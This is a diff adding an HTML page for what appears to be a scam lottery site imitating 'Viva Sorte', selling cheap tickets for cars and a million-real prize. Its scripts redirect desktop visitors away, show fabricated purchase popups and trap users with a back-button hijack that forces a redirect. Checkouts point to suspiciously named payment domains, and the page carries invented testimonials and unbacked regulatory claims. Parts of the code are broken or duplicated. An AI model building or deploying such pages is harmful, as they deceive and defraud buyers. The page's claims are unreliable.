@@ -1,0 +1,1587 @@
+
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <title>Viva Sorte Oficial</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+    }
+
+    .popup {
+      position: fixed;
+      bottom: 30px;
+      left: 30px;
+      background-color: #d4edda;
+      border-left: 6px solid #28a745;
+      color: #155724;
+      padding: 15px 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      display: none;
+      animation: fadeIn 0.5s ease-in-out;
+      z-index: 9999;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+<script>
+  // Função para detectar se é mobile
+  function isMobile() {
+    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  }
+
+  // Se NÃO for mobile, redireciona ou mostra mensagem
+  if (!isMobile()) {
+    // Opção 1: Redirecionar para outra página
+    window.location.href = "https://sorteioexpress.site/viva"; // ou página de erro
+
+    // Opção 2: Bloquear o conteúdo
+    // document.body.innerHTML = "<h1>Acesso permitido apenas por dispositivos móveis.</h1>";
+  }
+</script>
+
+<div class="popup" id="popup"></div>
+
+<!-- Som de notificação -->
+<audio id="notifySound" preload="auto">
+  <source src="media/beep-07.wav" type="audio/wav">
+  Seu navegador não suporta o formato de áudio.
+</audio>
+
+<script>
+  const mensagens = [
+    "João P. acabou de comprar 100 cotas!",
+    "Larissa F. acabou de comprar 40 cotas!",
+    "Diego S. acabou de comprar 70 cotas!",
+    "Juliana M. acabou de comprar 100 cotas!",
+    "Bruno T. acabou de comprar 50 cotas!",
+    "Carla R. acabou de comprar 30 cotas!",
+    "Felipe N. acabou de comprar 70 cotas!",
+    "Amanda C. acabou de comprar 70 cotas!",
+    "Pedro V. acabou de comprar 200 cotas!",
+    "Thais L. acabou de comprar 100 cotas!",
+    // Continue adicionando até 100
+  ];
+
+  const popup = document.getElementById('popup');
+  const notifySound = document.getElementById('notifySound');
+
+  let index = 0;
+
+  function mostrarPopup() {
+    if (index >= mensagens.length) return;
+
+    popup.innerText = mensagens[index];
+    popup.style.display = 'block';
+    notifySound.play(); // Toca o som de notificação
+
+    setTimeout(() => {
+      popup.style.display = 'none';
+      index++;
+      setTimeout(mostrarPopup, 5000); // Exibe o próximo pop-up após 5 segundos
+    }, 4000); // Pop-up fica visível por 4 segundos
+  }
+
+  window.onload = () => {
+    setTimeout(mostrarPopup, 1000); // Começa após 1 segundo
+  };
+</script>
+
+
+
+
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'http://sorteioagora.site/desc/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+<script src="js/latest_1.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'http://sorteioagora.site/desc/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Viva Sorte</title>
+  <link rel="icon" href="images/favicon.png" type="image/favicon.png">
+  <link href="css/style.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="css2.html" rel="stylesheet">
+  <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link rel="stylesheet" href="css/bootstrap-icons.min.css">
+  <style>
+  
+    .garantias-section, .depoimentos-section {
+      padding: 60px 0;
+      background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+    }
+
+    .garantia-card {
+      background: white;
+      border-radius: 15px;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);F
+      transition: transform 0.3s ease;
+      height: 100%;
+    }
+
+    .garantia-card:hover {
+      transform: translateY(-10px);
+    }
+
+    .garantia-card i {
+      font-size: 2.5rem;
+      color: #2f4eb5;
+      margin-bottom: 20px;
+    }
+
+    .garantia-card h3 {
+      color: #2f4eb5;
+      font-size: 1.2rem;
+      margin-bottom: 15px;
+    }
+
+    .depoimento-card {
+      background: white;
+      border-radius: 15px;
+      padding: 25px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      transition: transform 0.3s ease;
+      height: 100%;
+    }
+
+    .depoimento-card:hover {
+      transform: translateY(-10px);
+    }
+
+    .depoimento-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .depoimento-header img {
+      width: 60px;
+      height: 60px;
+      object-fit: cover;
+      margin-right: 15px;
+      border: 3px solid #2f4eb5;
+    }
+
+    .depoimento-info h4 {
+      color: #2f4eb5;
+      margin: 0;
+    }
+
+    .depoimento-info p {
+      color: #6c757d;
+      margin: 5px 0 0;
+    }
+
+    .depoimento-texto {
+      font-style: italic;
+      color: #495057;
+      margin-bottom: 15px;
+    }
+
+    .depoimento-data {
+      color: #6c757d;
+      font-size: 0.9rem;
+    }
+
+    .banner-urgencia {
+      background: linear-gradient(135deg, #ffc107 0%, #ffb300 100%);
+      padding: 15px 0;
+    }
+
+    .banner-urgencia .alert {
+      background: transparent;
+      border: none;
+      color: #000;
+      margin: 0;
+    }
+
+    .banner-urgencia .alert i {
+      font-size: 1.5rem;
+      color: #000;
+    }
+
+    #cotas-restantes {
+      font-weight: bold;
+      color: #dc3545;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
+    .highlight {
+      animation: highlight 1s ease;
+    }
+
+    @keyframes highlight {
+      0% { background-color: #ffc107; }
+      100% { background-color: transparent; }
+    }
+
+    .cota {
+      transition: all 0.3s ease;
+    }
+
+    .cota:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+    }
+
+    .cota-selected {
+      border: 2px solid #2f4eb5;
+      transform: scale(1.05);
+    }
+
+    .adc-carrinho {
+      background: #ffc107;
+      color: #000;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 25px;
+      font-weight: bold;
+      font-size: 1.2rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(255, 193, 7, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      max-width: 300px;
+      margin: 20px auto;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .adc-carrinho::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transform: translateX(-100%);
+      animation: shine 3s infinite;
+    }
+
+    .adc-carrinho:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 20px rgba(255, 193, 7, 0.4);
+    }
+
+    .adc-carrinho:disabled {
+      background: #ccc;
+      animation: none;
+    }
+
+    @keyframes shine {
+      0% {
+        transform: translateX(-100%);
+      }
+      20%, 100% {
+        transform: translateX(100%);
+      }
+    }
+
+    .adc-carrinho {
+      animation: pulse 2s infinite;
+    }
+
+    .contador-cotas {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+      margin: 20px 0;
+    }
+
+    .btn-contador-cotas {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: none;
+      background: #2f4eb5;
+      color: white;
+      font-size: 1.2rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-contador-cotas:hover {
+      background: #1a3a8f;
+      transform: scale(1.1);
+    }
+
+    .input-contador-cotas {
+      width: 80px;
+      height: 40px;
+      text-align: center;
+      border: 2px solid #2f4eb5;
+      border-radius: 8px;
+      font-size: 1.2rem;
+      font-weight: bold;
+    }
+
+    .ripple {
+      position: absolute;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: scale(0);
+      animation: ripple 0.6s linear;
+      pointer-events: none;
+    }
+
+    @keyframes ripple {
+      to {
+        transform: scale(4);
+        opacity: 0;
+      }
+    }
+
+    .cota, .adc-carrinho {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .bi-arrow-repeat {
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .popup-urgencia {
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%) scale(0.95);
+      background: #fff;
+      padding: 25px;
+      border-radius: 20px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+      z-index: 1000;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      border: 2px solid #2f4eb5;
+      animation: pulsePopup 2s infinite;
+    }
+
+    @keyframes pulsePopup {
+      0% {
+        transform: translate(-50%, -50%) scale(0.95);
+      }
+      50% {
+        transform: translate(-50%, -50%) scale(1);
+      }
+      100% {
+        transform: translate(-50%, -50%) scale(0.95);
+      }
+    }
+
+    .popup-urgencia.show {
+      transform: translate(-50%, -50%) scale(1);
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .popup-urgencia i {
+      font-size: 2.5rem;
+      color: #2f4eb5;
+      margin-bottom: 15px;
+      display: block;
+    }
+
+    .popup-urgencia-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .popup-urgencia-content strong {
+      color: #2f4eb5;
+      font-size: 1.3rem;
+      margin-bottom: 10px;
+    }
+
+    .popup-urgencia-content p {
+      color: #666;
+      font-size: 1rem;
+      margin: 0;
+      line-height: 1.4;
+    }
+
+    .popup-urgencia-content span {
+      color: #ffc107;
+      font-weight: bold;
+      font-size: 1.8rem;
+      display: block;
+      margin: 10px 0;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+      animation: pulse 2s infinite;
+    }
+
+    .btn-realizar-sonho {
+      background: #ffc107;
+      color: #000;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 25px;
+      font-weight: bold;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 15px;
+      animation: pulseButton 2s infinite;
+      box-shadow: 0 4px 15px rgba(255, 193, 7, 0.3);
+    }
+
+    .btn-realizar-sonho:hover {
+      transform: scale(1.05);
+      box-shadow: 0 6px 20px rgba(255, 193, 7, 0.4);
+    }
+
+    @keyframes pulseButton {
+      0% {
+        transform: scale(1);
+        box-shadow: 0 4px 15px rgba(255, 193, 7, 0.3);
+      }
+      50% {
+        transform: scale(1.05);
+        box-shadow: 0 6px 25px rgba(255, 193, 7, 0.5);
+      }
+      100% {
+        transform: scale(1);
+        box-shadow: 0 4px 15px rgba(255, 193, 7, 0.3);
+      }
+    }
+
+    .popup-urgencia .btn-close {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: none;
+      border: none;
+      color: #666;
+      cursor: pointer;
+      opacity: 0.7;
+      transition: opacity 0.3s ease;
+      padding: 3px;
+      font-size: 0.9rem;
+    }
+
+    .popup-urgencia .btn-close:hover {
+      opacity: 1;
+    }
+
+    @media (max-width: 768px) {
+      .popup-urgencia {
+        width: 85%;
+        padding: 20px;
+      }
+    }
+
+    /* Animações Gerais */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0px); }
+    }
+
+    @keyframes scaleIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    /* Elementos com Animações */
+    .banner {
+      animation: fadeIn 2s ease-out;
+    }
+
+    .tag-compre-agora {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      z-index: 10;
+      padding: 4px 10px;
+      border-radius: 13px;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    .tag-compre-agora span {
+      color: #fff;
+      font-weight: 500;
+      font-size: 0.9rem;
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+    }
+
+    .sorteio-date {
+      animation: scaleIn 0.8s ease-out;
+    }
+
+    .cota {
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      animation: fadeIn 0.5s ease-out;
+      animation-fill-mode: both;
+    }
+
+    .cota:nth-child(1) { animation-delay: 0.1s; }
+    .cota:nth-child(2) { animation-delay: 0.2s; }
+    .cota:nth-child(3) { animation-delay: 0.3s; }
+    .cota:nth-child(4) { animation-delay: 0.4s; }
+    .cota:nth-child(5) { animation-delay: 0.5s; }
+    .cota:nth-child(6) { animation-delay: 0.6s; }
+
+    .cota:hover {
+      transform: translateY(-10px) scale(1.05);
+      box-shadow: 0 15px 30px rgba(0,0,0,0.15);
+    }
+
+    .cota-selected {
+      animation: scaleIn 0.3s ease-out;
+    }
+
+    .garantia-card, .depoimento-card {
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      animation: fadeIn 0.8s ease-out;
+      animation-fill-mode: both;
+    }
+
+    .garantia-card:nth-child(1) { animation-delay: 0.2s; }
+    .garantia-card:nth-child(2) { animation-delay: 0.4s; }
+    .garantia-card:nth-child(3) { animation-delay: 0.6s; }
+    .garantia-card:nth-child(4) { animation-delay: 0.8s; }
+
+    .depoimento-card:nth-child(1) { animation-delay: 0.3s; }
+    .depoimento-card:nth-child(2) { animation-delay: 0.5s; }
+    .depoimento-card:nth-child(3) { animation-delay: 0.7s; }
+
+    .garantia-card:hover, .depoimento-card:hover {
+      transform: translateY(-10px) scale(1.02);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+    }
+
+    .garantia-card i {
+      transition: transform 0.3s ease;
+    }
+
+    .garantia-card:hover i {
+      transform: scale(1.2);
+    }
+
+    .btn-contador-cotas {
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .btn-contador-cotas:hover {
+      transform: scale(1.1) rotate(180deg);
+    }
+
+    .input-contador-cotas {
+      transition: all 0.3s ease;
+    }
+
+    .input-contador-cotas:focus {
+      transform: scale(1.05);
+      box-shadow: 0 0 0 3px rgba(47, 78, 181, 0.2);
+    }
+
+    /* Efeito de Ripple Melhorado */
+    .ripple {
+      position: absolute;
+      background: rgba(255, 255, 255, 0.4);
+      border-radius: 50%;
+      transform: scale(0);
+      animation: ripple 0.6s linear;
+      pointer-events: none;
+    }
+
+    @keyframes ripple {
+      to {
+        transform: scale(4);
+        opacity: 0;
+      }
+    }
+
+    /* Efeito de Loading Melhorado */
+    .bi-arrow-repeat {
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    /* Efeito de Destaque para Números */
+    .cota h1 {
+      transition: all 0.3s ease;
+    }
+
+    .cota:hover h1 {
+      color: #ffc107;
+      transform: scale(1.1);
+    }
+
+    /* Efeito de Hover nos Cards do Hospital */
+    .card-hospital {
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .card-hospital:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+    }
+
+    .card-hospital img {
+      transition: transform 0.3s ease;
+    }
+
+    .card-hospital:hover img {
+      transform: scale(1.1);
+    }
+
+    /* Efeito de Scroll Suave */
+    html {
+      scroll-behavior: smooth;
+    }
+
+    /* Efeito de Parallax no Banner */
+    .banner {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .banner img {
+      transition: transform 0.5s ease;
+    }
+
+    .banner:hover img {
+      transform: scale(1.05);
+    }
+
+    /* Efeito de Destaque para Textos Importantes */
+    .sorteio-date span {
+      transition: all 0.3s ease;
+    }
+
+    .sorteio-date span:hover {
+      transform: scale(1.1);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+
+    /* Efeito de Loading para o Popup */
+    .popup-urgencia {
+      animation: slideIn 0.5s ease-out;
+    }
+
+    @keyframes slideIn {
+      from {
+        transform: translateX(100%);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+
+    /* Efeito de Destaque para Ícones */
+    .bi {
+      transition: transform 0.3s ease;
+    }
+
+    .bi:hover {
+      transform: scale(1.2);
+    }
+
+    /* Efeito de Hover nos Links */
+    a {
+      transition: all 0.3s ease;
+    }
+
+    a:hover {
+      color: #ffc107;
+      text-decoration: none;
+    }
+
+    /* Efeito de Loading para Imagens */
+    img {
+      transition: opacity 0.3s ease;
+    }
+
+    img:hover {
+      opacity: 0.9;
+    }
+
+    /* Estilos para a seção de ganhadores */
+    .ganhadores-section {
+      padding: 40px 0;
+      background: #fff;
+    }
+
+    .ganhadores-title {
+      color: #2f4eb5;
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 2rem;
+      font-weight: bold;
+    }
+
+    .ganhadores-subtitle {
+      text-align: center;
+      color: #666;
+      margin-bottom: 40px;
+      font-size: 1rem;
+    }
+
+    .ganhadores-carousel {
+      display: flex;
+      justify-content: flex-start;
+      gap: 20px;
+      overflow-x: auto;
+      padding: 20px 0;
+      scroll-behavior: smooth;
+      -ms-overflow-style: none;  /* IE e Edge */
+      scrollbar-width: none;     /* Firefox */
+      cursor: grab;
+      -webkit-overflow-scrolling: touch; /* Para rolagem suave no iOS */
+    }
+
+    /* Esconde a barra de rolagem no Chrome, Safari e Opera */
+    .ganhadores-carousel::-webkit-scrollbar {
+      display: none;
+    }
+
+    /* Estilo quando estiver arrastando */
+    .ganhadores-carousel:active {
+      cursor: grabbing;
+    }
+
+    .ganhador-card {
+      background: #fff;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      overflow: hidden;
+      width: 220px;
+      transition: all 0.3s ease;
+      animation: fadeIn 0.5s ease-out;
+    }
+
+    .ganhador-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+    }
+
+    .ganhador-foto {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      margin: 20px auto;
+      display: block;
+      object-fit: cover;
+      border: 3px solid #2f4eb5;
+    }
+
+    .ganhador-info {
+      text-align: center;
+      padding: 0 15px 20px;
+    }
+
+    .ganhador-numero {
+      color: #2f4eb5;
+      font-weight: bold;
+      font-size: 0.9rem;
+      margin-bottom: 5px;
+    }
+
+    .ganhador-nome {
+      font-weight: bold;
+      margin-bottom: 5px;
+      font-size: 1rem;
+    }
+
+    .ganhador-cidade {
+      color: #666;
+      font-size: 0.9rem;
+      margin-bottom: 10px;
+    }
+
+    .ganhador-premio {
+      background: #f8f9fa;
+      padding: 10px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      color: #333;
+    }
+
+    .ver-mais-btn {
+      display: block;
+      width: fit-content;
+      margin: 30px auto 0;
+      padding: 12px 30px;
+      background: #2f4eb5;
+      color: #fff;
+      border-radius: 25px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: all 0.3s ease;
+      animation: pulseButton 2s infinite;
+      position: relative;
+      overflow: hidden;
+    }
+
+    @keyframes pulseButton {
+      0% {
+        transform: scale(1);
+        box-shadow: 0 5px 15px rgba(47, 78, 181, 0.3);
+      }
+      50% {
+        transform: scale(1.05);
+        box-shadow: 0 5px 25px rgba(47, 78, 181, 0.5);
+      }
+      100% {
+        transform: scale(1);
+        box-shadow: 0 5px 15px rgba(47, 78, 181, 0.3);
+      }
+    }
+
+    .ver-mais-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        120deg,
+        transparent,
+        rgba(255, 255, 255, 0.3),
+        transparent
+      );
+      animation: shine 3s infinite;
+    }
+
+    @keyframes shine {
+      0% {
+        transform: translateX(-100%);
+      }
+      20%, 100% {
+        transform: translateX(100%);
+      }
+    }
+
+    @media (max-width: 768px) {
+      .ganhadores-carousel {
+        padding: 20px;
+        justify-content: flex-start;
+      }
+      
+      .ganhador-card {
+        flex-shrink: 0;
+      }
+    }
+  </style>
+
+  <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '971059741623758');
+fbq('init', '1442771230430645');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr?id=971059741623758&ev=PageView&noscript=1"></noscript>
+<!-- End Meta Pixel Code -->
+  
+  <script>
+  window.pixelId = "6816defb95eba7edaa223b04";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>><script async="" defer="" src="js/pixel.js"></script>
+
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  
+
+
+
+
+   
+
+  
+    <meta charset="utf-8">
+  
+
+
+<div class="banner">
+
+
+<div class="container-banner">
+
+<div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
+      <div class="carousel-inner">
+
+        <div class="carousel-item active">
+          <div class="tag-compre-agora">
+            <a href="https://pay.compraegurapaay.com/checkout/4dbe2974-bf2d-4c6e-bd79-e90b36c4229b" style="text-decoration: none; color: inherit;">
+              <span>Compre Agora!</span>
+            </a>
+          </div>
+
+          <img src="images/sorteio13.png" class="d-block w-100" alt="..." style="transform: translateY(166.5px);">
+        </div>
+
+      </div>
+    </div>
+
+<!--
+    <div class="infos-banner">
+            <h1>Viva Sorte - 02/06/2024</h1> 
+            <h2>DOM, 02 JUN | 2024</h2> 
+            <h3>PORSCHE + BMW + RAM POR APENAS 99 CENTAVOS!</h3>        
+    </div>
+-->
+
+
+    </div>
+
+
+
+
+    </div>
+
+
+    <div class="sorteio-date w-100 text-center">
+      <h1>Sorteio HOJE <span style="background-color: #f0ad4e;" id="contador">0 dias</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
+    </div>
+
+
+  <div class="container-principal">
+
+    <!-- BANNER -->
+
+    <!-- COTAS -->
+
+    <div class="cotas">
+
+      <div class="cotas-one">
+                  <button type="button" class="cota" onclick="selecionarValor(15)">
+            <div class="cota-qtd">                    
+                +15
+            </div>
+            <h1>R$14,85</h1>
+            <h2>SELECIONAR</h2>
+        </button>
+
+        <button type="button" class="cota cota-selected" onclick="selecionarValor(30)">
+            <div class="cota-qtd">
+                +30
+            </div>
+            <h1>R$29,70</h1>
+            <h2>SELECIONAR</h2>
+        </button>
+
+        <button type="button" class="cota" onclick="selecionarValor(40)">
+            <div class="cota-qtd">
+            +40
+            </div>
+            <h1>R$39,60</h1>
+            <h2>SELECIONAR</h2>
+        </button>
+
+        
+
+      </div>
+
+      <div class="cotas-one">
+          
+          <button type="button" class="cota" onclick="selecionarValor(70)">
+            <i class="bi bi-star-fill destaque"></i>
+            <div class="cota-qtd">
+            +70
+            </div>
+            <h1>R$69,30</h1>
+            <h2>SELECIONAR</h2>
+        </button>
+
+        
+
+        <button type="button" class="cota" onclick="selecionarValor(100)">
+            <div class="cota-qtd">
+            +100
+            </div>
+            <h1>R$99,00</h1>
+            <h2>SELECIONAR</h2>
+        </button>
+        
+        <button type="button" class="cota" onclick="selecionarValor(200)">
+            <div class="cota-qtd">
+            +200
+            </div>
+            <h1>R$199,00</h1>
+            <h2>SELECIONAR</h2>
+        </button>
+
+
+
+      </div>
+
+    </div>
+
+  </div>
+
+  <div class="container-principal">
+    <div class="contador-cotas">
+      <span>
+        <button type="button" class="btn-contador-cotas" onclick="decrementar()">
+          <i class="bi bi-dash-lg"></i>
+        </button>
+      </span>
+      <input type="number" id="numero" class="input-contador-cotas" value="0" min="0" oninput="highlightButton()">
+      <span>
+        <button type="button" class="btn-contador-cotas" onclick="incrementar()">
+          <i class="bi bi-plus-lg"></i>
+        </button>
+      </span>
+    </div>
+
+    <button type="button" id="btn-adicionar-carrinho" class="adc-carrinho" onclick="adicionarAoCarrinho(" https:="" pay.pagamentoseguroghostpay.com="" ebf61a19-3415-4f5e-b677-433e9192a838")"="">
+      <i class="bi bi-cart-fill"></i> 
+      <span>COMPRAR AGORA</span>
+      <i class="bi bi-arrow-right"></i>
+    </button>
+
+    <div class="sorteio-date w-100 text-center" style="margin-top: 5px;">
+      <h1 style="font-size: 0.72rem;">EDIÇÃO ESPECIAL SORTE MILIONÁRIA! MEGA PRÊMIO DE UM MILHÃO!</h1>
+    </div>
+  </div>
+
+  <div class="container-principal">
+    <div class="hospital">
+      <div class="card-hospital" style="opacity: 1; transform: translateY(0px);">
+        <div class="card-hospital-image">
+          <img src="images/logo-hospital.svg">
+          <h2>Instituição beneficiada</h2>
+        </div>
+        <div class="card-hospital-text">
+          <p>O Hospital do Câncer de Londrina, fundado em 08 de novembro de 1965 por Lucilla Pinto Ballalai, foi originalmente chamado Centro Norte Paranaense de Pesquisas Médicas. Criado com o objetivo de melhorar o tratamento do câncer e a qualidade de vida, o hospital focava inicialmente na prevenção do câncer de colo de útero entre as mulheres de Londrina e região. A instituição sempre buscou aprimorar seus recursos humanos, científicos e tecnológicos.</p>
+        </div>
+      </div>
+      
+      <div class="card-hospital card-hospital-bg-azul" style="opacity: 1; transform: translateY(0px);">
+        <div class="card-hospital-image">
+          <img src="images/viva-hosp.svg">
+          <h2>Viva Privilégios</h2>
+        </div>
+        <div class="card-hospital-text">
+          <p>Viva Privilégios, um programa que enriquece sua vida com acesso à saúde, alimentação, transporte e mais. Com cada compra, acumule pontos para trocar por consultas médicas, receber cashback, e utilizar serviços de telefonia e apps de transporte e alimentação. Eleve sua qualidade de vida e desfrute de mais conveniência e economia!</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="garantias-section">
+    <div class="container-principal">
+      <h2 class="text-center mb-4">Por que escolher a Viva Sorte?</h2>
+      <div class="row">
+        <div class="col-md-3">
+          <div class="garantia-card">
+            <i class="bi bi-shield-check"></i>
+            <h3>100% Garantido</h3>
+            <p>Sorteios regulamentados pela SUSEP e 100% transparentes</p>
+          </div>
+        </div>
+        <div class="col-md-3">
+          <div class="garantia-card">
+            <i class="bi bi-lightning-charge"></i>
+            <h3>Entrega Rápida</h3>
+            <p>Ganhadores recebem o prêmio em até 30 dias</p>
+          </div>
+        </div>
+        <div class="col-md-3">
+          <div class="garantia-card">
+            <i class="bi bi-people"></i>
+            <h3>+10.000 Ganhadores</h3>
+            <p>Mais de 10 mil pessoas já foram premiadas</p>
+          </div>
+        </div>
+        <div class="col-md-3">
+          <div class="garantia-card">
+            <i class="bi bi-credit-card"></i>
+            <h3>Pagamento Seguro</h3>
+            <p>Transações 100% seguras e criptografadas</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="depoimentos-section">
+    <div class="container-principal">
+      <h2 class="text-center mb-4">O que dizem nossos ganhadores</h2>
+      <div class="row">
+        <div class="col-md-4">
+          <div class="depoimento-card">
+            <div class="depoimento-header">
+              <img src="images/avatar1.jpg" alt="Ganhador" class="rounded-circle">
+              <div class="depoimento-info">
+                <h4>João Silva</h4>
+                <p>Ganhador do Porsche</p>
+              </div>
+            </div>
+            <p class="depoimento-texto">"Nunca imaginei que ganharia um carro desses! Comprei apenas 50 titulos e fui sorteado. O processo foi super transparente e rápido!"</p>
+            <div class="depoimento-data">Ganhador em 15/03/2025</div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="depoimento-card">
+            <div class="depoimento-header">
+              <img src="images/avatar5.jpg" alt="Ganhador" class="rounded-circle">
+              <div class="depoimento-info">
+                <h4>Lourdes Castanhari</h4>
+                <p>Ganhador da BMW</p>
+              </div>
+            </div>
